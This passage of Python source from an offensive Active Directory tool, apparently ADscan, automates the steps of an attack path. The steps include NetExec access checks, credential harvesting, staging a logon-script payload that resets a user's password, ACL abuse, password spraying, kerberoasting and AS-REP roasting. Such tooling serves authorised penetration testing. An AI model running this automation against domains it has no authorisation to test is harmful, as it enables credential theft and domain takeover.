                target_host = resolve_netexec_target_for_node_label(
                    shell, domain, node_label=to_label
                )
                if not isinstance(target_host, str) or not target_host.strip():
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: target node is not a resolvable host.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="target_not_resolvable_host",
                    )
                    print_warning(
                        f"Cannot execute {action}: target node is not a resolvable host."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Target node is not a resolvable host",
                    )
                    return execution_started
                target_host = target_host.strip()

                service_map: dict[str, str] = {
                    "adminto": "smb",
                    "sqladmin": "mssql",
                    "canrdp": "rdp",
                    "canpsremote": "winrm",
                }
                service = service_map[key]

                if not hasattr(shell, "run_service_command"):
                    print_warning(
                        "Cannot execute this step: NetExec privilege checker is unavailable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Execution helper unavailable (NetExec missing)",
                    )
                    return execution_started

                auth = shell.build_auth_nxc(
                    exec_username, password, domain, kerberos=False
                )
                log_file = (
                    f"domains/{domain}/{service}/verify_{exec_username}_{service}.log"
                )
                netexec_timeout_seconds = get_recommended_internal_timeout(service)
                command = (
                    f"{shell.netexec_path} {service} {target_host} {auth} "
                    f"--timeout {netexec_timeout_seconds} --log {log_file}"
                )
                print_info_verbose(f"Command: {command}")

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} on {to_label or target_host}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                    actor=exec_username,
                    target_host=target_host,
                )
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "target": target_host},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "target": target_host},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    ok = shell.run_service_command(
                        command,
                        domain,
                        service,
                        exec_username,
                        password,
                        return_boolean=True,
                    )
                    if not ok:
                        marked_host = mark_sensitive(target_host, "hostname")
                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_failed",
                            message=f"{action} did not confirm access on {to_label or target_host}.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status="failed",
                            actor=exec_username,
                            target_host=target_host,
                            reason="access_not_confirmed",
                        )
                        print_warning(
                            f"{action} check did not confirm access on {marked_host}. Stopping this path."
                        )
                        return True

                    update_edge_status_by_labels(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="success",
                        notes={"username": exec_username, "target": target_host},
                    )
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_succeeded",
                        message=f"{action} succeeded against {to_label or target_host}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="success",
                        actor=exec_username,
                        target_host=target_host,
                    )

                    if key == "adminto":
                        _attempt_post_adminto_credential_harvest(
                            shell,
                            domain=domain,
                            steps=steps,
                            current_step_index=idx - 1,
                            compromised_host_label=to_label,
                            exec_username=exec_username,
                            exec_password=password,
                            resolved_target_host=target_host,
                        )

                    followup = getattr(shell, f"ask_for_{service}_access", None)
                    if callable(followup):
                        followup(domain, target_host, exec_username, password)
                continue

            if key == "writelogonscript":
                if not from_label or not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing path endpoint details.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_from_to_details",
                    )
                    print_warning(f"Cannot execute {action}: missing from/to details.")
                    return execution_started

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} staging-share precheck on {to_label}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                )
                probe_state, probe_notes = _execute_writelogonscript_precheck(
                    shell,
                    domain=domain,
                    summary=summary,
                    from_label=from_label,
                    to_label=to_label,
                    details=details,
                    context_username=context_username,
                    context_password=context_password,
                )
                _update_attack_path_edge_status(
                    shell,
                    domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    status=(
                        "attempted"
                        if probe_state == "precheck_succeeded"
                        else "failed"
                        if probe_state == "failed"
                        else "blocked"
                    ),
                    notes=probe_notes,
                )
                if probe_state == "blocked":
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: no usable execution credential context was available.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason=str(probe_notes.get("reason") or "no_usable_execution_context"),
                        actor=str(probe_notes.get("user") or ""),
                    )
                    print_warning(
                        f"Cannot execute {action}: no usable execution credential context available."
                    )
                    return execution_started
                if probe_state == "failed":
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_failed",
                        message=f"{action} staging-share write precheck failed on {to_label}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="failed",
                        actor=str(probe_notes.get("user") or ""),
                        reason=str(probe_notes.get("reason") or "netlogon_write_probe_failed"),
                    )
                    print_warning(
                        f"{action} precheck failed: could not upload a benign probe file to any supported staging share."
                    )
                    return execution_started

                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_succeeded",
                    message=f"{action} staging-share write precheck succeeded on {to_label}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempted",
                    actor=str(probe_notes.get("user") or ""),
                    reason=str(probe_notes.get("reason") or "netlogon_write_probe_succeeded"),
                )
                strategy_state, strategy_notes = _execute_writelogonscript_force_change_password_strategy(
                    shell,
                    domain=domain,
                    summary=summary,
                    current_step_index=idx - 1,
                    from_label=from_label,
                    to_label=to_label,
                    details=details,
                    context_username=context_username,
                    context_password=context_password,
                    precheck_notes=probe_notes,
                )
                if strategy_state == "payload_staged":
                    final_notes = dict(details)
                    final_notes.update(probe_notes)
                    final_notes.update(strategy_notes)
                    step["status"] = "success"
                    step["details"] = final_notes
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="success",
                        notes=final_notes,
                    )
                    print_info(
                        "WriteLogonScript payload staged: the script was uploaded and scriptPath was updated. "
                        f"When {mark_sensitive(to_label, 'user')} logs on, the payload should run and reset "
                        f"{mark_sensitive(str(strategy_notes.get('next_step_target_user') or ''), 'user')}."
                    )
                    validation_policy = _get_writelogonscript_lockout_policy_state(
                        shell,
                        domain=domain,
                        username=str(strategy_notes.get("user") or ""),
                        password=str(context_password or _resolve_domain_password(shell, domain, str(strategy_notes.get("user") or "")) or ""),
                    )
                    final_notes["validation_policy"] = validation_policy
                    if not bool(validation_policy.get("auto_validation_safe")):
                        final_notes.update(
                            {
                                "verification_status": "manual_required",
                                "manual_validation_required": True,
                                "target_login_required": True,
                            }
                        )
                        step["status"] = "success"
                        step["details"] = final_notes
                        _update_attack_path_edge_status(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="success",
                            notes=final_notes,
                        )
                        register_writelogonscript_manual_validation(
                            shell,
                            domain=domain,
                            username=str(strategy_notes.get("next_step_target_user") or ""),
                            credential=str(strategy_notes.get("generated_password") or ""),
                            summary=summary,
                            from_label=from_label,
                            to_label=to_label,
                        )
                        _render_writelogonscript_manual_validation_panel(
                            domain=domain,
                            target_user=str(strategy_notes.get("next_step_target_user") or ""),
                            credential=str(strategy_notes.get("generated_password") or ""),
                            policy_state=validation_policy,
                        )
                        return execution_started
                    poll_notes = _poll_writelogonscript_followup_credential(
                        shell,
                        domain=domain,
                        summary=summary,
                        from_label=from_label,
                        to_label=to_label,
                        target_user=str(strategy_notes.get("next_step_target_user") or ""),
                        target_password=str(strategy_notes.get("generated_password") or ""),
                    )
                    final_notes.update(poll_notes)
                    step["status"] = "success"
                    step["details"] = final_notes
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="success",
                        notes=final_notes,
                    )
                    if str(poll_notes.get("verification_status") or "") == "confirmed":
                        chained_step_notes = {
                            "verification_status": "executed_via_writelogonscript",
                            "execution_origin_action": action,
                            "execution_origin_from": from_label,
                            "execution_origin_to": to_label,
                            "credential_confirmed_user": str(
                                strategy_notes.get("next_step_target_user") or ""
                            ),
                            "credential_confirmed_at": str(
                                poll_notes.get("verification_completed_at") or ""
                            ),
                            "credential_confirmed_wait_seconds": int(
                                poll_notes.get("verification_wait_seconds") or 0
                            ),
                        }
                        continue_path = _apply_chained_step_execution_result(
                            source_action=action,
                            source_from_label=from_label,
                            source_to_label=to_label,
                            execution_result={
                                "step_index": int(
                                    strategy_notes.get("chained_step_index") or -1
                                ),
                                "action": str(
                                    strategy_notes.get("chained_step_action")
                                    or strategy_notes.get("next_step_action")
                                    or ""
                                ),
                                "from_label": str(
                                    strategy_notes.get("chained_step_from_label")
                                    or to_label
                                    or ""
                                ),
                                "to_label": str(
                                    strategy_notes.get("chained_step_to_label")
                                    or ""
                                ),
                                "status": "success",
                                "notes": chained_step_notes,
                                "actor": str(strategy_notes.get("user") or ""),
                                "reason": "executed_via_writelogonscript",
                                "follow_on_outcome": {
                                    "key": "user_credential_obtained",
                                    "compromised_user": str(
                                        strategy_notes.get("next_step_target_user") or ""
                                    ),
                                    "credential": str(
                                        strategy_notes.get("generated_password") or ""
                                    ),
                                },
                            },
                        )
                        add_credential_fn = getattr(shell, "add_credential", None)
                        if callable(add_credential_fn):
                            add_credential_fn(
                                domain,
                                str(strategy_notes.get("next_step_target_user") or ""),
                                str(strategy_notes.get("generated_password") or ""),
                                prompt_for_user_privs_after=False,
                            )
                        _attempt_writelogonscript_cleanup_if_ready(
                            shell,
                            domain=domain,
                            summary=summary,
                        )
                        if continue_path:
                            continue
                    else:
                        _apply_chained_step_execution_result(
                            source_action=action,
                            source_from_label=from_label,
                            source_to_label=to_label,
                            execution_result={
                                "step_index": int(
                                    strategy_notes.get("chained_step_index") or -1
                                ),
                                "action": str(
                                    strategy_notes.get("chained_step_action")
                                    or strategy_notes.get("next_step_action")
                                    or ""
                                ),
                                "from_label": str(
                                    strategy_notes.get("chained_step_from_label")
                                    or to_label
                                    or ""
                                ),
                                "to_label": str(
                                    strategy_notes.get("chained_step_to_label")
                                    or ""
                                ),
                                "status": "attempted",
                                "notes": {
                                    "verification_status": "pending",
                                    "execution_origin_action": action,
                                    "execution_origin_from": from_label,
                                    "execution_origin_to": to_label,
                                    "credential_confirmed_user": str(
                                        strategy_notes.get("next_step_target_user") or ""
                                    ),
                                    "verification_wait_seconds": int(
                                        poll_notes.get("verification_wait_seconds") or 0
                                    ),
                                    "verification_attempts": int(
                                        poll_notes.get("verification_attempts") or 0
                                    ),
                                    "target_login_required": bool(
                                        poll_notes.get("target_login_required")
                                    ),
                                },
                                "actor": str(strategy_notes.get("user") or ""),
                                "reason": "pending_via_writelogonscript",
                            },
                        )
                    return execution_started
                if strategy_state == "failed":
                    final_notes = dict(details)
                    final_notes.update(probe_notes)
                    final_notes.update(strategy_notes)
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="failed",
                        notes=final_notes,
                    )
                    print_warning(
                        "WriteLogonScript staging failed after the write precheck succeeded."
                    )
                    return execution_started
                if strategy_state == "blocked":
                    final_notes = dict(details)
                    final_notes.update(probe_notes)
                    final_notes.update(strategy_notes)
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="blocked",
                        notes=final_notes,
                    )
                    print_warning(
                        "WriteLogonScript payload staging was blocked."
                    )
                    return execution_started
                print_info(
                    "WriteLogonScript precheck succeeded: staging-share write was confirmed with a benign .bat probe. "
                    "No supported follow-up payload strategy was available yet."
                )
                return execution_started

            if key in ACL_ACE_RELATIONS:
                if not from_label or not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing path endpoint details.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_from_to_details",
                    )
                    print_warning(f"Cannot execute {action}: missing from/to details.")
                    return execution_started

                exec_context = build_ace_step_context(
                    shell,
                    domain,
                    relation=key,
                    summary=summary,
                    from_label=from_label,
                    to_label=to_label,
                    context_username=context_username,
                    context_password=context_password,
                )
                if not exec_context:
                    marked_from = mark_sensitive(from_label, "node")
                    marked_to = mark_sensitive(to_label, "node")
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: no usable execution credential context was available.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="no_usable_execution_context",
                    )
                    print_warning(
                        f"Cannot execute {action} ({marked_from} -> {marked_to}): "
                        "no usable execution credential context available."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="No usable execution credential context available",
                    )
                    return execution_started

                supported, reason = describe_ace_step_support(exec_context)
                if not supported:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: target type is not supported for this step.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason=reason or "unsupported_target_type",
                        actor=exec_context.exec_username,
                    )
                    # Show the same "not implemented" UX: action is mapped in general,
                    # but not for this target object type.
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unsupported",
                        reason=reason or "Not supported for this target type",
                    )
                    table = Table(
                        title=Text(
                            "Steps in this path", style=f"bold {BRAND_COLORS['info']}"
                        ),
                        show_header=True,
                        header_style=f"bold {BRAND_COLORS['info']}",
                        show_lines=True,
                    )
                    table.add_column("#", style="dim", width=4, justify="right")
                    table.add_column("Action", style="bold")
                    table.add_column(
                        "Supported", style="bold", width=10, justify="center"
                    )
                    table.add_column("Notes", style="dim", overflow="fold")

                    for step_idx, step_item in enumerate(steps, start=1):
                        if not isinstance(step_item, dict):
                            continue
                        step_action = str(step_item.get("action") or "").strip()
                        step_key = step_action.lower()

                        if step_idx == idx:
                            supported_label = Text("No", style="bold red")
                            notes = reason or "Not implemented for this target type"
                        elif step_key in supported_actions:
                            supported_label = Text("Yes", style="bold green")
                            notes = supported_actions.get(step_key, "")
                        elif step_key in non_executable_actions:
                            supported_label = Text("N/A", style="bold cyan")
                            notes = non_executable_actions.get(step_key, "")
                        elif step_key in dangerous_actions:
                            supported_label = Text("No", style="bold yellow")
                            notes = dangerous_actions.get(step_key, "")
                        else:
                            supported_label = Text("No", style="bold red")
                            notes = "Not implemented yet in ADscan"
                        table.add_row(
                            str(step_idx), step_action or "N/A", supported_label, notes
                        )

                    message = Text()
                    message.append(
                        "This attack path can't be executed yet.\n\n", style="bold red"
                    )
                    message.append(
                        "ADscan recognizes this action, but it is not implemented for the "
                        "target object type in this path.\n",
                        style="red",
                    )
                    marked_to = mark_sensitive(to_label, "node")
                    message.append(
                        f"\nUnsupported step: {action} -> {marked_to}\n",
                        style="dim",
                    )
                    if reason:
                        message.append(f"\nReason: {reason}\n", style="dim")
                    message.append(
                        "\nTip: pick a path that contains only supported steps for the "
                        "target types, or continue with other enumeration steps.",
                        style="dim",
                    )

                    print_panel(
                        [message, table],
                        title=Text("Attack Path Not Implemented", style="bold red"),
                        border_style="red",
                        expand=False,
                    )
                    return False

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} on {to_label}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                    actor=exec_context.exec_username,
                )
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"user": exec_context.exec_username},
                ):
                    try:
                        _update_attack_path_step_status_at_index(
                            shell,
                            domain=domain,
                            summary=summary,
                            step_index=idx - 1,
                            status="attempted",
                            notes={"user": exec_context.exec_username},
                        )

                        ace_result = execute_ace_step(shell, context=exec_context)
                        last_outcome = get_last_ace_execution_outcome(shell) or {}
                        _apply_execution_outcome_context_handoff(last_outcome)
                        register_cleanup_from_outcome(
                            shell,
                            domain=domain,
                            outcome=last_outcome,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                        )
                        offer_followups = (
                            idx == last_executable_idx and ace_result is True
                        )
                        if ace_result is True:
                            _update_attack_path_step_status_at_index(
                                shell,
                                domain=domain,
                                summary=summary,
                                step_index=idx - 1,
                                status="success",
                                notes={"user": exec_context.exec_username},
                            )
                            _record_attack_path_execution_event(
                                shell,
                                domain=domain,
                                summary=summary,
                                event_stage="step_succeeded",
                                message=f"{action} succeeded on {to_label}.",
                                step_index=idx,
                                total_steps=total_executable_steps,
                                executable_step_index=executable_step_position,
                                last_executable_idx=last_executable_idx,
                                action=action,
                                from_label=from_label,
                                to_label=to_label,
                                step_status="success",
                                actor=exec_context.exec_username,
                            )
                        elif ace_result is False:
                            _update_attack_path_step_status_at_index(
                                shell,
                                domain=domain,
                                summary=summary,
                                step_index=idx - 1,
                                status="failed",
                                notes={"user": exec_context.exec_username},
                            )
                            _record_attack_path_execution_event(
                                shell,
                                domain=domain,
                                summary=summary,
                                event_stage="step_failed",
                                message=f"{action} failed on {to_label}.",
                                step_index=idx,
                                total_steps=total_executable_steps,
                                executable_step_index=executable_step_position,
                                last_executable_idx=last_executable_idx,
                                action=action,
                                from_label=from_label,
                                to_label=to_label,
                                step_status="failed",
                                actor=exec_context.exec_username,
                            )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        print_warning(f"Error while executing {action} step.")
                        print_exception(show_locals=False, exception=exc)
                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_failed",
                            message=f"{action} raised an exception during execution.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status="failed",
                            actor=exec_context.exec_username,
                            reason=str(exc),
                        )
                        if hasattr(shell, "_update_active_attack_graph_step_status"):
                            try:
                                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                    domain=domain,
                                    status="failed",
                                    notes={"error": str(exc)},
                                )
                            except Exception as exc2:  # noqa: BLE001
                                telemetry.capture_exception(exc2)

                if offer_followups:
                    followups = build_followups_for_step(
                        shell,
                        domain=domain,
                        step_action=key,
                        exec_username=exec_context.exec_username,
                        exec_password=exec_context.exec_password,
                        target_kind=exec_context.target_kind,
                        target_label=to_label or exec_context.target_sam_or_label,
                        target_domain=exec_context.target_domain,
                        target_sam_or_label=exec_context.target_sam_or_label,
                    )
                    _run_runtime_followups(
                        step_action=action,
                        target_label_value=to_label or exec_context.target_sam_or_label,
                        initial_followups=followups,
                        last_outcome=last_outcome,
                    )

                continue

            if key in {"passwordspray", "useraspass", "blankpassword", "computerpre2k"}:
                if not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing target principal.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_target_principal",
                    )
                    print_warning(f"Cannot execute {action}: missing target principal.")
                    return execution_started

                target_user = _normalize_account(to_label)
                if not target_user:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: invalid target principal.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="invalid_target_principal",
                    )
                    print_warning(f"Cannot execute {action}: invalid target principal.")
                    return execution_started

                spray_type, spray_category, spray_password = (
                    _extract_password_spray_step_metadata(details)
                )
                effective_spray_type = spray_category or spray_type
                marked_target = mark_sensitive(target_user, "user")
                marked_spray_type = mark_sensitive(
                    str(effective_spray_type or "N/A"),
                    "detail",
                )

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} against {target_user}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                )
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "target_user": target_user,
                        "spray_type": effective_spray_type or "",
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "target_user": target_user,
                                "spray_type": effective_spray_type or "",
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    spray_runner = getattr(shell, "execute_password_spray_attack_step", None)
                    if callable(spray_runner):
                        attempted = bool(
                            spray_runner(
                                domain,
                                spray_type=effective_spray_type,
                                password=spray_password,
                                entry_label=from_label or None,
                            )
                        )
                    else:
                        from adscan_internal.cli.spraying import (
                            execute_password_spray_attack_step,
                        )

                        attempted = bool(
                            execute_password_spray_attack_step(
                                shell,
                                domain,
                                spray_type=effective_spray_type,
                                password=spray_password,
                                entry_label=from_label or None,
                            )
                        )

                    if not attempted:
                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_blocked",
                            message=f"Cannot execute {action}: spray mode could not be started.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status="blocked",
                            reason="spray_mode_could_not_start",
                        )
                        print_warning(
                            f"Cannot execute {action}: spray mode "
                            f"{marked_spray_type} could not be started."
                        )
                        _mark_blocked_step(
                            action,
                            from_label,
                            to_label,
                            kind="unavailable",
                            reason="Spray mode could not be started",
                        )
                        return execution_started

                    recovered_credential = _get_stored_domain_credential_for_user(
                        shell,
                        domain=domain,
                        username=target_user,
                    )
                    if not recovered_credential:
                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_failed",
                            message=f"{action} did not recover credentials for {target_user}.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status="failed",
                            reason="credential_not_recovered",
                        )
                        if hasattr(shell, "_update_active_attack_graph_step_status"):
                            try:
                                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                    domain=domain,
                                    status="failed",
                                    notes={
                                        "target_user": target_user,
                                        "spray_type": effective_spray_type or "",
                                    },
                                )
                            except Exception as exc:  # noqa: BLE001
                                telemetry.capture_exception(exc)
                        print_warning(
                            f"{action} did not recover credentials for "
                            f"{marked_target}. Stopping this path."
                        )
                        return True

                    context_username = target_user
                    context_password = recovered_credential
                    print_info_debug(
                        f"[attack_paths] execution context handed off after {action}: "
                        f"user={marked_target} "
                        f"spray_type={marked_spray_type}"
                    )
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="success",
                            notes={
                                "target_user": target_user,
                                "spray_type": effective_spray_type or "",
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    if hasattr(shell, "_update_active_attack_graph_step_status"):
                        try:
                            shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                domain=domain,
                                status="success",
                                notes={
                                    "target_user": target_user,
                                    "spray_type": effective_spray_type or "",
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_succeeded",
                        message=f"{action} recovered credentials for {target_user}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="success",
                        actor=target_user,
                    )
                continue

            if key in {"kerberoasting", "asreproasting"}:
                if not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing target user.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_target_user",
                    )
                    print_warning(f"Cannot execute {action}: missing target user.")
                    return execution_started
                target_user = _normalize_account(to_label)
                if not target_user:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: invalid target user.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="invalid_target_user",
                    )
                    print_warning(f"Cannot execute {action}: invalid target user.")
                    return execution_started

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} against {target_user}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                )
                ok = False
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"target_user": target_user},
                ):
                    if key == "kerberoasting":
                        ok = run_kerberoast_for_user(
                            shell, domain, target_user=target_user
                        )
                    else:
                        ok = run_asreproast_for_user(
                            shell, domain, target_user=target_user
                        )
                if not ok:
                    marked_user = mark_sensitive(target_user, "user")
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_failed",
                        message=f"{action} did not recover credentials for {target_user}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="failed",
                        reason="credential_not_recovered",
                    )
                    print_warning(
                        f"{action} did not recover credentials for {marked_user}. Stopping this path."
                    )
                    return True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_succeeded",
                    message=f"{action} recovered credentials for {target_user}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="success",
                    actor=target_user,
                )
                last_outcome = get_last_ace_execution_outcome(shell) or {}
                _apply_execution_outcome_context_handoff(last_outcome)
                if idx == last_executable_idx:
                    _run_runtime_followups(
                        step_action=action,
                        target_label_value=to_label or target_user,
                        last_outcome=last_outcome,
                    )
                # If cracking succeeded, downstream steps can use the stored credential.
                continue

            if key == "adcsesc1":
                if not from_label or not to_label:
